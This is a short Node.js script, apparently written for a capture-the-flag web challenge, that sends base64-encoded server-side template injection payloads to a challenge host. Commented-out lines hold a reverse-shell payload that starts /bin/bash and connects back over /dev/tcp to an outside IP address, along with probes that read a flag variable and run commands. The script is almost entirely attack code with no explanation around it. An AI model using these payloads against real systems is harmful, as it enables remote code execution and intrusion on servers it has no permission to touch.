const axios = require('axios').default;


async function sendRequest(template) {
  let tmpBuffer = Buffer.from(template);
  let encodedTmp = encodeURIComponent(tmpBuffer.toString('base64'));
  let url = 'http://webfugu.sharkyctf.xyz/process' + '?page=' + encodedTmp;
  console.log(url);

  let res = await axios.get(url);
  console.log(res.data);
}




// web fugu is black listing the word `java`
async function main() {
  let payload = `
  <script th:inline="dart">
  var myFile = new File('file.txt');
  </script>
  `;
  // await sendRequest('[[${flag}]]');
  // await sendRequest('[[${fishes}]]');
  // await sendRequest('[[${new ProcessBuilder("/bin/bash", "-i", "9<>/dev/tcp/153.126.161.91/8080", "<&9 >&9", "2>&9").start()}]]');
  // await sendRequest('[[${new ProcessBuilder("echo ", "hoge").start()}]]');
  // await sendRequest("[[(var='hoge')]]");
  await sendRequest("[[${#this.getCLass()}]]");
}


main();
